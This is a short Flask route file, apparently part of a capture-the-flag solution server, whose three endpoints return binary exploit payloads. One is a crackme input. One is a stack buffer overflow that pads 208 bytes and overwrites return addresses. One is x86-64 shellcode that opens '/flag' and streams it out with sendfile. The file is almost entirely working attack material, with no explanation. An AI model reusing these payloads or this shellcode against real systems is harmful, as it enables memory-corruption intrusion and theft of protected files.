import json
import logging

from flask import request

from routes import app

logger = logging.getLogger(__name__)


@app.route('/payload_crackme', methods=['GET'])
def payload_crackme():
    return b'`p\x02\x008484990'

@app.route('/payload_stack', methods=['GET'])
def payload_stack():
    return b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@\x00\x00\x00\x00\x00\xfa\x11@\x00\x00\x00\x00\x00'
    #return b'A' * 208 + b'\x1a\x10@\x00\x00\x00\x00\x00\xfd\x11@\x00\x00\x00\x00\x00\n'
	#return b'A' * 208 + b'\xfd\x11@\x00\x00\x00\x00\x00'

@app.route('/payload_shellcode', methods=['GET'])
def payload_shellcode():
    return b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$j\x02XH\x89\xe71\xf6\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05'